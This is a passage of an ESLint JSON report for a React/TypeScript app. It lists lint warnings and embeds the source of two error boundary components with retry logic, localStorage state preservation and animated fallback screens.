components.","line":660,"column":14,"nodeType":"Identifier","messageId":"namedExport","endLine":660,"endColumn":37},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":663,"column":75,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":663,"endColumn":78,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[20229,20232],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[20229,20232],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":666,"column":17,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":666,"endColumn":20,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[20315,20318],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[20315,20318],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Use a new file to share constants or functions between components.","line":678,"column":14,"nodeType":"Identifier","messageId":"namedExport","endLine":678,"endColumn":39}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":24,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Enhanced Error Boundary Component (2025)\n * \n * Modern error boundary implementation that combines react-error-boundary patterns\n * with advanced state preservation and recovery capabilities.\n * \n * Features:\n * - Automatic recovery with resetKeys\n * - State preservation and restoration\n * - Integration with crash recovery service\n * - User-friendly recovery options\n * - Performance monitoring\n * - Telemetry integration\n */\n\nimport React, { Component, ErrorInfo, ReactNode, useCallback } from 'react';\nimport { ErrorBoundary as ReactErrorBoundary, useErrorBoundary } from 'react-error-boundary';\nimport { motion, AnimatePresence } from 'framer-motion';\nimport { AlertTriangle, RefreshCw, Home, Bug, History, Download } from 'lucide-react';\n\n// Enhanced error boundary props\nexport interface EnhancedErrorBoundaryProps {\n  children: ReactNode;\n  fallback?: ReactNode;\n  FallbackComponent?: React.ComponentType<ErrorFallbackProps>;\n  onError?: (error: Error, errorInfo: ErrorInfo) => void;\n  onReset?: (details: { reason: \"imperative-api\"; args: any[]; } | { reason: \"keys\"; prev: any[] | undefined; next: any[] | undefined; }) => void;\n  resetKeys?: Array<string | number | boolean | null | undefined>;\n  resetOnPropsChange?: boolean;\n  isolationLevel?: 'none' | 'component' | 'feature' | 'page';\n  enableStatePreservation?: boolean;\n  enableAutoRecovery?: boolean;\n  enableUserRecovery?: boolean;\n  enableTelemetry?: boolean;\n  maxRetries?: number;\n  retryDelay?: number;\n  stateKey?: string;\n  recoveryStrategies?: RecoveryStrategy[];\n}\n\n// Error fallback component props\nexport interface ErrorFallbackProps {\n  error: Error;\n  resetErrorBoundary: (...args: any[]) => void;\n  preservedState?: any;\n  recoveryOptions?: RecoveryOption[];\n  retryCount?: number;\n  maxRetries?: number;\n  onDownloadReport?: () => void;\n  onRestoreState?: (strategy: string) => void;\n}\n\n// Recovery strategy configuration\nexport interface RecoveryStrategy {\n  id: string;\n  name: string;\n  description: string;\n  icon: React.ComponentType<any>;\n  priority: number;\n  automatic: boolean;\n  requiresConfirmation: boolean;\n  execute: () => Promise<boolean>;\n}\n\n// Recovery option for UI\nexport interface RecoveryOption {\n  id: string;\n  label: string;\n  description: string;\n  icon: React.ComponentType<any>;\n  action: () => void;\n  variant: 'primary' | 'secondary' | 'destructive';\n}\n\n// Enhanced error boundary state\ninterface EnhancedErrorBoundaryState {\n  hasError: boolean;\n  error: Error | null;\n  errorInfo: ErrorInfo | null;\n  retryCount: number;\n  lastResetKey: any;\n  preservedState: any;\n  recoveryAttempted: boolean;\n  autoRecoveryInProgress: boolean;\n}\n\n/**\n * Class-based error boundary with enhanced features\n */\nclass EnhancedErrorBoundaryClass extends Component<\n  EnhancedErrorBoundaryProps,\n  EnhancedErrorBoundaryState\n> {\n  private autoRetryTimeoutId: NodeJS.Timeout | null = null;\n  private stateBackupKey: string;\n  \n  constructor(props: EnhancedErrorBoundaryProps) {\n    super(props);\n    \n    this.stateBackupKey = `error_boundary_${props.stateKey || 'default'}_state`;\n    this.state = {\n      hasError: false,\n      error: null,\n      errorInfo: null,\n      retryCount: 0,\n      lastResetKey: this.serializeResetKeys(props.resetKeys),\n      preservedState: null,\n      recoveryAttempted: false,\n      autoRecoveryInProgress: false\n    };\n  }\n\n  static getDerivedStateFromError(error: Error): Partial<EnhancedErrorBoundaryState> {\n    return {\n      hasError: true,\n      error\n    };\n  }\n\n  componentDidCatch(error: Error, errorInfo: ErrorInfo) {\n    this.setState({\n      error,\n      errorInfo\n    });\n\n    // Preserve state if enabled\n    if (this.props.enableStatePreservation) {\n      this.preserveApplicationState();\n    }\n\n    // Report error with telemetry\n    if (this.props.enableTelemetry) {\n      this.reportErrorToTelemetry(error, errorInfo);\n    }\n\n    // Call custom error handler\n    this.props.onError?.(error, errorInfo);\n\n    // Attempt automatic recovery if enabled\n    if (this.props.enableAutoRecovery && this.state.retryCount < (this.props.maxRetries || 3)) {\n      this.attemptAutoRecovery();\n    }\n  }\n\n  componentDidUpdate(prevProps: EnhancedErrorBoundaryProps) {\n    const { resetKeys, resetOnPropsChange } = this.props;\n    const { hasError } = this.state;\n\n    // Check for reset key changes\n    const currentResetKeys = this.serializeResetKeys(resetKeys);\n    const prevResetKeys = this.serializeResetKeys(prevProps.resetKeys);\n    \n    if (hasError && currentResetKeys !== prevResetKeys) {\n      this.resetErrorBoundary('resetKeys changed');\n    }\n\n    // Check for prop changes\n    if (hasError && resetOnPropsChange && this.hasPropsChanged(prevProps)) {\n      this.resetErrorBoundary('props changed');\n    }\n\n    // Update reset key tracking\n    if (currentResetKeys !== this.state.lastResetKey) {\n      this.setState({ lastResetKey: currentResetKeys });\n    }\n  }\n\n  componentWillUnmount() {\n    if (this.autoRetryTimeoutId) {\n      clearTimeout(this.autoRetryTimeoutId);\n    }\n  }\n\n  private serializeResetKeys(resetKeys?: any[]): string {\n    return JSON.stringify(resetKeys || []);\n  }\n\n  private hasPropsChanged(prevProps: EnhancedErrorBoundaryProps): boolean {\n    const currentProps = this.props;\n    const keysToCheck = ['children', 'fallback', 'FallbackComponent'] as const;\n    \n    return keysToCheck.some(key => currentProps[key] !== prevProps[key]);\n  }\n\n  private preserveApplicationState(): void {\n    try {\n      // Get current state from local storage and session storage\n      const preservedData = {\n        localStorage: this.extractStorageData(localStorage),\n        sessionStorage: this.extractStorageData(sessionStorage),\n        timestamp: Date.now(),\n        url: window.location.href,\n        userAgent: navigator.userAgent,\n        error: {\n          message: this.state.error?.message,\n          stack: this.state.error?.stack,\n          name: this.state.error?.name\n        }\n      };\n\n      localStorage.setItem(this.stateBackupKey, JSON.stringify(preservedData));\n      \n      console.debug('Application state preserved for error recovery', {\n        stateKey: this.stateBackupKey,\n        dataSize: JSON.stringify(preservedData).length\n      });\n    } catch (error) {\n      console.warn('Failed to preserve application state:', error);\n    }\n  }\n\n  private extractStorageData(storage: Storage): Record<string, any> {\n    const data: Record<string, any> = {};\n    \n    try {\n      for (let i = 0; i < storage.length; i++) {\n        const key = storage.key(i);\n        if (key && this.shouldPreserveStorageKey(key)) {\n          const value = storage.getItem(key);\n          if (value) {\n            try {\n              data[key] = JSON.parse(value);\n            } catch {\n              data[key] = value;\n            }\n          }\n        }\n      }\n    } catch (error) {\n      console.warn('Failed to extract storage data:', error);\n    }\n    \n    return data;\n  }\n\n  private shouldPreserveStorageKey(key: string): boolean {\n    // Preserve taskmaster-related keys and exclude sensitive data\n    const preservePatterns = [\n      /^taskmaster-/,\n      /^app_state/,\n      /_store$/,\n      /backup_/\n    ];\n    \n    const excludePatterns = [\n      /^auth/,\n      /^token/,\n      /^session/,\n      /password/,\n      /secret/\n    ];\n    \n    const shouldPreserve = preservePatterns.some(pattern => pattern.test(key));\n    const shouldExclude = excludePatterns.some(pattern => pattern.test(key));\n    \n    return shouldPreserve && !shouldExclude;\n  }\n\n  private reportErrorToTelemetry(error: Error, errorInfo: ErrorInfo): void {\n    try {\n      // In a real implementation, this would integrate with the telemetry service\n      console.error('Error Boundary Telemetry:', {\n        error: {\n          name: error.name,\n          message: error.message,\n          stack: error.stack\n        },\n        errorInfo: {\n          componentStack: errorInfo.componentStack\n        },\n        context: {\n          stateKey: this.props.stateKey,\n          retryCount: this.state.retryCount,\n          isolationLevel: this.props.isolationLevel,\n          url: window.location.href,\n          timestamp: Date.now()\n        }\n      });\n    } catch (telemetryError) {\n      console.warn('Failed to report error to telemetry:', telemetryError);\n    }\n  }\n\n  private attemptAutoRecovery(): void {\n    if (this.state.autoRecoveryInProgress) return;\n    \n    this.setState({ autoRecoveryInProgress: true });\n    \n    const delay = (this.props.retryDelay || 1000) * Math.pow(2, this.state.retryCount);\n    \n    this.autoRetryTimeoutId = setTimeout(() => {\n      this.setState(prevState => ({\n        autoRecoveryInProgress: false,\n        recoveryAttempted: true,\n        retryCount: prevState.retryCount + 1\n      }));\n      \n      this.resetErrorBoundary('auto recovery');\n    }, delay);\n  }\n\n  private resetErrorBoundary = (reason: string): void => {\n    if (this.autoRetryTimeoutId) {\n      clearTimeout(this.autoRetryTimeoutId);\n      this.autoRetryTimeoutId = null;\n    }\n\n    this.setState({\n      hasError: false,\n      error: null,\n      errorInfo: null,\n      autoRecoveryInProgress: false\n    });\n\n    // Call reset handler\n    this.props.onReset?.({ reason: \"imperative-api\", args: [] });\n\n    console.debug('Error boundary reset:', { reason, stateKey: this.props.stateKey });\n  };\n\n  private getRecoveryOptions(): RecoveryOption[] {\n    const options: RecoveryOption[] = [\n      {\n        id: 'retry',\n        label: 'Try Again',\n        description: 'Retry the operation that caused the error',\n        icon: RefreshCw,\n        action: () => this.resetErrorBoundary('manual retry'),\n        variant: 'primary'\n      }\n    ];\n\n    // Add state restoration option if state was preserved\n    const preservedData = localStorage.getItem(this.stateBackupKey);\n    if (preservedData && this.props.enableStatePreservation) {\n      options.push({\n        id: 'restore',\n        label: 'Restore Previous State',\n        description: 'Restore the application to its previous state',\n        icon: History,\n        action: () => this.restorePreservedState(),\n        variant: 'secondary'\n      });\n    }\n\n    // Add page reload option for severe errors\n    if (this.state.retryCount > 1) {\n      options.push({\n        id: 'reload',\n        label: 'Reload Page',\n        description: 'Reload the entire page to recover',\n        icon: RefreshCw,\n        action: () => window.location.reload(),\n        variant: 'secondary'\n      });\n    }\n\n    // Add home navigation for app-level errors\n    if (this.props.isolationLevel === 'page') {\n      options.push({\n        id: 'home',\n        label: 'Go Home',\n        description: 'Navigate to the home page',\n        icon: Home,\n        action: () => window.location.href = '/',\n        variant: 'secondary'\n      });\n    }\n\n    return options;\n  }\n\n  private restorePreservedState(): void {\n    try {\n      const preservedData = localStorage.getItem(this.stateBackupKey);\n      if (!preservedData) return;\n\n      const parsed = JSON.parse(preservedData);\n      \n      // Restore localStorage data\n      Object.entries(parsed.localStorage || {}).forEach(([key, value]) => {\n        try {\n          localStorage.setItem(key, typeof value === 'string' ? value : JSON.stringify(value));\n        } catch (error) {\n          console.warn(`Failed to restore localStorage key \"${key}\":`, error);\n        }\n      });\n\n      this.resetErrorBoundary('state restored');\n      \n    } catch (error) {\n      console.error('Failed to restore preserved state:', error);\n    }\n  }\n\n  private generateErrorReport(): string {\n    const report = {\n      error: {\n        name: this.state.error?.name,\n        message: this.state.error?.message,\n        stack: this.state.error?.stack\n      },\n      errorInfo: {\n        componentStack: this.state.errorInfo?.componentStack\n      },\n      context: {\n        stateKey: this.props.stateKey,\n        retryCount: this.state.retryCount,\n        isolationLevel: this.props.isolationLevel,\n        url: window.location.href,\n        userAgent: navigator.userAgent,\n        timestamp: new Date().toISOString()\n      },\n      preservedState: this.state.preservedState\n    };\n\n    return JSON.stringify(report, null, 2);\n  }\n\n  private downloadErrorReport = (): void => {\n    const report = this.generateErrorReport();\n    const blob = new Blob([report], { type: 'application/json' });\n    const url = URL.createObjectURL(blob);\n    \n    const a = document.createElement('a');\n    a.href = url;\n    a.download = `error-report-${Date.now()}.json`;\n    document.body.appendChild(a);\n    a.click();\n    document.body.removeChild(a);\n    URL.revokeObjectURL(url);\n  };\n\n  render() {\n    if (this.state.hasError) {\n      const { FallbackComponent, fallback } = this.props;\n      const recoveryOptions = this.getRecoveryOptions();\n\n      // Custom fallback component\n      if (FallbackComponent) {\n        return (\n          <FallbackComponent\n            error={this.state.error!}\n            resetErrorBoundary={this.resetErrorBoundary}\n            preservedState={this.state.preservedState}\n            recoveryOptions={recoveryOptions}\n            retryCount={this.state.retryCount}\n            maxRetries={this.props.maxRetries || 3}\n            onDownloadReport={this.downloadErrorReport}\n            onRestoreState={this.restorePreservedState}\n          />\n        );\n      }\n\n      // Custom fallback element\n      if (fallback) {\n        return fallback;\n      }\n\n      // Default fallback UI\n      return (\n        <DefaultErrorFallback\n          error={this.state.error!}\n          resetErrorBoundary={this.resetErrorBoundary}\n          recoveryOptions={recoveryOptions}\n          retryCount={this.state.retryCount}\n          maxRetries={this.props.maxRetries || 3}\n          autoRecoveryInProgress={this.state.autoRecoveryInProgress}\n          onDownloadReport={this.downloadErrorReport}\n          isolationLevel={this.props.isolationLevel || 'component'}\n        />\n      );\n    }\n\n    return this.props.children;\n  }\n}\n\n/**\n * Default error fallback component with modern UI\n */\ninterface DefaultErrorFallbackProps {\n  error: Error;\n  resetErrorBoundary: (reason: string) => void;\n  recoveryOptions: RecoveryOption[];\n  retryCount: number;\n  maxRetries: number;\n  autoRecoveryInProgress: boolean;\n  onDownloadReport: () => void;\n  isolationLevel: string;\n}\n\nconst DefaultErrorFallback: React.FC<DefaultErrorFallbackProps> = ({\n  error,\n  recoveryOptions,\n  retryCount,\n  maxRetries,\n  autoRecoveryInProgress,\n  onDownloadReport,\n  isolationLevel\n}) => {\n  const isAppLevel = isolationLevel === 'page';\n\n  return (\n    <motion.div\n      initial={{ opacity: 0, scale: 0.95 }}\n      animate={{ opacity: 1, scale: 1 }}\n      transition={{ duration: 0.3 }}\n      className={`\n        flex flex-col items-center justify-center p-8 text-center\n        ${isAppLevel ? 'min-h-screen bg-background' : 'min-h-64 bg-card rounded-lg border'}\n      `}\n    >\n      <motion.div\n        initial={{ y: -20 }}\n        animate={{ y: 0 }}\n        transition={{ delay: 0.1 }}\n        className=\"mb-6\"\n      >\n        <div className=\"relative\">\n          <motion.div\n            animate={{ \n              rotate: autoRecoveryInProgress ? 360 : [0, -10, 10, 0],\n              scale: autoRecoveryInProgress ? [1, 1.1, 1] : 1\n            }}\n            transition={{ \n              duration: autoRecoveryInProgress ? 1 : 2, \n              repeat: autoRecoveryInProgress ? Infinity : Infinity,\n              repeatDelay: autoRecoveryInProgress ? 0 : 3\n            }}\n            className=\"w-16 h-16 mx-auto text-destructive\"\n          >\n            <AlertTriangle size={64} />\n          </motion.div>\n        </div>\n      </motion.div>\n\n      <motion.div\n        initial={{ y: 20, opacity: 0 }}\n        animate={{ y: 0, opacity: 1 }}\n        transition={{ delay: 0.2 }}\n        className=\"space-y-4 max-w-md\"\n      >\n        <h2 className=\"text-2xl font-bold text-foreground\">\n          {isAppLevel ? 'Application Error' : 'Component Error'}\n        </h2>\n        \n        <p className=\"text-muted-foreground\">\n          {autoRecoveryInProgress\n            ? 'Attempting automatic recovery...'\n            : isAppLevel \n              ? 'An unexpected error occurred. We\\'re working to recover your session.'\n              : 'This component encountered an error. Other parts of the app should work normally.'\n          }\n        </p>\n\n        {/* Error details in development */}\n        {process.env.NODE_ENV === 'development' && error && (\n          <motion.details\n            initial={{ opacity: 0 }}\n            animate={{ opacity: 1 }}\n            transition={{ delay: 0.4 }}\n            className=\"text-left bg-muted/50 rounded-lg p-4 mt-4\"\n          >\n            <summary className=\"cursor-pointer font-medium text-sm mb-2 flex items-center gap-2\">\n              <Bug size={16} />\n              Error Details (Development)\n            </summary>\n            <pre className=\"text-xs text-destructive overflow-auto max-h-32 whitespace-pre-wrap\">\n              {error.name}: {error.message}\n              {'\\n\\n'}\n              {error.stack}\n            </pre>\n          </motion.details>\n        )}\n\n        {/* Recovery progress */}\n        {autoRecoveryInProgress && (\n          <motion.div\n            initial={{ opacity: 0 }}\n            animate={{ opacity: 1 }}\n            className=\"w-full bg-muted rounded-full h-2\"\n          >\n            <motion.div\n              initial={{ width: 0 }}\n              animate={{ width: '100%' }}\n              transition={{ duration: 2, ease: \"easeInOut\" }}\n              className=\"bg-primary h-2 rounded-full\"\n            />\n          </motion.div>\n        )}\n\n        {/* Retry counter */}\n        {retryCount > 0 && !autoRecoveryInProgress && (\n          <motion.p\n            initial={{ opacity: 0 }}\n            animate={{ opacity: 1 }}\n            className=\"text-sm text-muted-foreground\"\n          >\n            Recovery attempt: {retryCount}/{maxRetries}\n          </motion.p>\n        )}\n      </motion.div>\n\n      {/* Recovery options */}\n      {!autoRecoveryInProgress && (\n        <motion.div\n          initial={{ y: 20, opacity: 0 }}\n          animate={{ y: 0, opacity: 1 }}\n          transition={{ delay: 0.3 }}\n          className=\"flex flex-wrap gap-3 mt-8\"\n        >\n          <AnimatePresence>\n            {recoveryOptions.map((option) => (\n              <motion.button\n                key={option.id}\n                initial={{ opacity: 0, scale: 0.8 }}\n                animate={{ opacity: 1, scale: 1 }}\n                exit={{ opacity: 0, scale: 0.8 }}\n                whileHover={{ scale: 1.05 }}\n                whileTap={{ scale: 0.95 }}\n                onClick={option.action}\n                className={`\n                  inline-flex items-center gap-2 px-4 py-2 rounded-lg transition-colors\n                  ${option.variant === 'primary' \n                    ? 'bg-primary text-primary-foreground hover:bg-primary/90'\n                    : option.variant === 'destructive'\n                    ? 'bg-destructive text-destructive-foreground hover:bg-destructive/90'\n                    : 'bg-secondary text-secondary-foreground hover:bg-secondary/90'\n                  }\n                `}\n              >\n                <option.icon size={16} />\n                {option.label}\n              </motion.button>\n            ))}\n          </AnimatePresence>\n\n          {/* Download error report */}\n          <motion.button\n            initial={{ opacity: 0, scale: 0.8 }}\n            animate={{ opacity: 1, scale: 1 }}\n            whileHover={{ scale: 1.05 }}\n            whileTap={{ scale: 0.95 }}\n            onClick={onDownloadReport}\n            className=\"inline-flex items-center gap-2 px-4 py-2 bg-muted text-muted-foreground rounded-lg hover:bg-muted/90 transition-colors\"\n          >\n            <Download size={16} />\n            Download Report\n          </motion.button>\n        </motion.div>\n      )}\n    </motion.div>\n  );\n};\n\n/**\n * Hook for manual error handling\n */\nexport const useEnhancedErrorHandler = () => {\n  const { showBoundary } = useErrorBoundary();\n  \n  const reportError = useCallback((error: Error, context?: Record<string, any>) => {\n    // Add context to error if provided\n    if (context) {\n      (error as any).__errorContext = context;\n    }\n    \n    showBoundary(error);\n  }, [showBoundary]);\n\n  return { reportError };\n};\n\n/**\n * Higher-order component wrapper\n */\nexport const withEnhancedErrorBoundary = <P extends object>(\n  Component: React.ComponentType<P>,\n  errorBoundaryProps?: Omit<EnhancedErrorBoundaryProps, 'children'>\n) => {\n  const WrappedComponent = (props: P) => (\n    <EnhancedErrorBoundaryClass {...errorBoundaryProps}>\n      <Component {...props} />\n    </EnhancedErrorBoundaryClass>\n  );\n\n  WrappedComponent.displayName = `withEnhancedErrorBoundary(${Component.displayName || Component.name})`;\n  \n  return WrappedComponent;\n};\n\n/**\n * Main enhanced error boundary component using react-error-boundary\n */\nexport const EnhancedErrorBoundary: React.FC<EnhancedErrorBoundaryProps> = ({\n  children,\n  resetKeys,\n  onReset,\n  onError,\n  ...props\n}) => {\n  return (\n    <ReactErrorBoundary\n      FallbackComponent={(fallbackProps) => (\n        <EnhancedErrorBoundaryClass {...props} {...fallbackProps}>\n          {children}\n        </EnhancedErrorBoundaryClass>\n      )}\n      resetKeys={resetKeys}\n      onReset={(details) => onReset?.(details)}\n      onError={onError}\n    >\n      {children}\n    </ReactErrorBoundary>\n  );\n};\n\n// Export the class-based component as default for direct use\nexport default EnhancedErrorBoundaryClass;\n\n","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/error/ErrorBoundary.tsx","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":12,"column":14,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":12,"endColumn":17,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[474,477],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[474,477],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":25,"column":17,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":25,"endColumn":20,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[988,991],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[988,991],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":82,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":82,"endColumn":21,"suggestions":[{"fix":{"range":[2464,2534],"text":""},"messageId":"removeConsole","data":{"propertyName":"info"},"desc":"Remove the console.info()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":86,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":86,"endColumn":20,"suggestions":[{"fix":{"range":[2640,2697],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":87,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":87,"endColumn":20,"suggestions":[{"fix":{"range":[2704,2744],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":151,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":151,"endColumn":17,"suggestions":[{"fix":{"range":[4501,4687],"text":""},"messageId":"removeConsole","data":{"propertyName":"info"},"desc":"Remove the console.info()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":181,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":181,"endColumn":19,"suggestions":[{"fix":{"range":[5436,5495],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":7,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import React, { Component, ReactNode, ErrorInfo } from 'react';\nimport { motion } from 'framer-motion';\nimport { AlertTriangle, RefreshCw, Home, Bug } from 'lucide-react';\nimport { handleErrorBoundaryError } from '@/utils/errorLogging';\nimport { saveViewState } from '@/utils/statePreservation';\n\ninterface Props {\n  children: ReactNode;\n  fallback?: ReactNode;\n  onError?: (error: Error, errorInfo: ErrorInfo) => void;\n  level?: 'app' | 'component' | 'route';\n  resetKey?: any; // Auto-reset when this value changes\n  resetOnPropsChange?: boolean; // Reset when any prop changes\n  isolate?: boolean; // Prevent error propagation to parent boundaries\n  viewType?: string; // For view-specific error tracking\n  enableStatePreservation?: boolean; // Save component state before errors\n}\n\ninterface State {\n  hasError: boolean;\n  error: Error | null;\n  errorInfo: ErrorInfo | null;\n  retryCount: number;\n  errorId: string | null; // Unique identifier for this error instance\n  lastResetKey: any; // Track the last resetKey value\n}\n\nconst MAX_RETRY_COUNT = 3;\n\nexport class ErrorBoundary extends Component<Props, State> {\n  private retryTimeoutId: number | null = null;\n  private stateBackupKey: string;\n\n  constructor(props: Props) {\n    super(props);\n    this.stateBackupKey = `error_boundary_${props.viewType || 'default'}_backup`;\n    this.state = {\n      hasError: false,\n      error: null,\n      errorInfo: null,\n      retryCount: 0,\n      errorId: null,\n      lastResetKey: props.resetKey\n    };\n  }\n\n  static getDerivedStateFromError(error: Error): Partial<State> {\n    return {\n      hasError: true,\n      error,\n      errorId: `err_${Date.now()}_${Math.random().toString(36).substring(2)}`\n    };\n  }\n\n  componentDidCatch(error: Error, errorInfo: ErrorInfo) {\n    this.setState({\n      error,\n      errorInfo\n    });\n\n    // Enhanced error handling with 2025 best practices\n    try {\n      // Use the new error logging system\n      handleErrorBoundaryError(\n        error,\n        errorInfo,\n        this.props.level || 'component',\n        this.props.viewType\n      );\n\n      // Save state before error if preservation is enabled\n      if (this.props.enableStatePreservation) {\n        this.preservePreErrorState();\n      }\n\n      // Call optional error handler\n      this.props.onError?.(error, errorInfo);\n\n      // Prevent error propagation if isolate mode is enabled\n      if (this.props.isolate) {\n        // Log that we're isolating the error\n        console.info('Error isolated to prevent propagation:', error.message);\n      }\n    } catch (handlingError) {\n      // Fallback error handling if our error handling fails\n      console.error('Error in error handling:', handlingError);\n      console.error('Original error:', error);\n    }\n  }\n\n  componentDidUpdate(prevProps: Props): void {\n    // Reset error state if resetKey changes\n    if (this.props.resetKey !== prevProps.resetKey && this.state.hasError) {\n      this.resetErrorState('resetKey changed');\n    }\n\n    // Reset if resetOnPropsChange is enabled and any prop changed\n    if (this.props.resetOnPropsChange && \n        this.state.hasError && \n        this.hasPropsChanged(prevProps)) {\n      this.resetErrorState('props changed');\n    }\n\n    // Update lastResetKey tracking\n    if (this.props.resetKey !== this.state.lastResetKey) {\n      this.setState({ lastResetKey: this.props.resetKey });\n    }\n  }\n\n  handleRetry = () => {\n    const { retryCount } = this.state;\n    \n    if (retryCount < MAX_RETRY_COUNT) {\n      this.resetErrorState('manual retry', retryCount + 1);\n\n      // Auto-retry with exponential backoff for component-level errors\n      if (this.props.level === 'component') {\n        const delay = Math.pow(2, retryCount) * 1000; // 1s, 2s, 4s\n        this.retryTimeoutId = window.setTimeout(() => {\n          this.setState({ hasError: false, error: null, errorInfo: null, errorId: null });\n        }, delay);\n      }\n    }\n  };\n\n  handleReload = () => {\n    window.location.reload();\n  };\n\n  handleGoHome = () => {\n    window.location.href = '/';\n  };\n\n  componentWillUnmount() {\n    if (this.retryTimeoutId) {\n      window.clearTimeout(this.retryTimeoutId);\n    }\n  }\n\n  // Enhanced helper methods for 2025 functionality\n  private resetErrorState = (reason: string, newRetryCount?: number) => {\n    this.setState({\n      hasError: false,\n      error: null,\n      errorInfo: null,\n      errorId: null,\n      retryCount: newRetryCount ?? this.state.retryCount\n    });\n\n    // Log recovery for monitoring\n    console.info(`Error boundary recovered: ${reason}`, {\n      viewType: this.props.viewType,\n      level: this.props.level,\n      retryCount: newRetryCount ?? this.state.retryCount\n    });\n  };\n\n  private hasPropsChanged = (prevProps: Props): boolean => {\n    const currentProps = this.props;\n    const keysToCheck = ['children', 'fallback', 'level', 'viewType'] as const;\n    \n    return keysToCheck.some(key => currentProps[key] !== prevProps[key]);\n  };\n\n  private preservePreErrorState = () => {\n    try {\n      if (this.props.viewType) {\n        const stateToSave = {\n          errorInfo: {\n            timestamp: new Date().toISOString(),\n            errorId: this.state.errorId,\n            retryCount: this.state.retryCount,\n            viewType: this.props.viewType,\n            level: this.props.level\n          }\n        };\n        \n        saveViewState(this.stateBackupKey, stateToSave);\n      }\n    } catch (error) {\n      console.warn('Failed to preserve pre-error state:', error);\n    }\n  };\n\n  render() {\n    if (this.state.hasError) {\n      // Custom fallback UI provided\n      if (this.props.fallback) {\n        return this.props.fallback;\n      }\n\n      const { error, retryCount } = this.state;\n      const { level = 'component' } = this.props;\n      \n      const canRetry = retryCount < MAX_RETRY_COUNT;\n      const isAppLevel = level === 'app';\n\n      return (\n        <motion.div\n          initial={{ opacity: 0, scale: 0.95 }}\n          animate={{ opacity: 1, scale: 1 }}\n          transition={{ duration: 0.3 }}\n          className={`\n            flex flex-col items-center justify-center p-8 text-center\n            ${isAppLevel ? 'min-h-screen bg-background' : 'min-h-64 bg-card rounded-lg border'}\n          `}\n        >\n          <motion.div\n            initial={{ y: -20 }}\n            animate={{ y: 0 }}\n            transition={{ delay: 0.1 }}\n            className=\"mb-6\"\n          >\n            <div className=\"relative\">\n              <motion.div\n                animate={{ rotate: [0, -10, 10, 0] }}\n                transition={{ duration: 2, repeat: Infinity, repeatDelay: 3 }}\n                className=\"w-16 h-16 mx-auto text-destructive\"\n              >\n                <AlertTriangle size={64} />\n              </motion.div>\n              \n              {/* Decorative elements */}\n              <motion.div\n                initial={{ scale: 0 }}\n                animate={{ scale: 1 }}\n                transition={{ delay: 0.3, type: \"spring\" }}\n                className=\"absolute -top-2 -right-2 w-6 h-6 bg-destructive/20 rounded-full\"\n              />\n              <motion.div\n                initial={{ scale: 0 }}\n                animate={{ scale: 1 }}\n                transition={{ delay: 0.5, type: \"spring\" }}\n                className=\"absolute -bottom-1 -left-3 w-4 h-4 bg-destructive/10 rounded-full\"\n              />\n            </div>\n          </motion.div>\n\n          <motion.div\n            initial={{ y: 20, opacity: 0 }}\n            animate={{ y: 0, opacity: 1 }}\n            transition={{ delay: 0.2 }}\n            className=\"space-y-4 max-w-md\"\n          >\n            <h2 className=\"text-2xl font-bold text-foreground\">\n              {isAppLevel ? 'Something went wrong' : 'Component Error'}\n            </h2>\n            \n            <p className=\"text-muted-foreground\">\n              {isAppLevel \n                ? 'An unexpected error occurred in the application. Please try refreshing the page.'\n                : 'This component encountered an error. You can try again or continue using other parts of the app.'\n              }\n            </p>\n\n            {/* Error details in development */}\n            {process.env.NODE_ENV === 'development' && error && (\n              <motion.details\n                initial={{ opacity: 0 }}\n                animate={{ opacity: 1 }}\n                transition={{ delay: 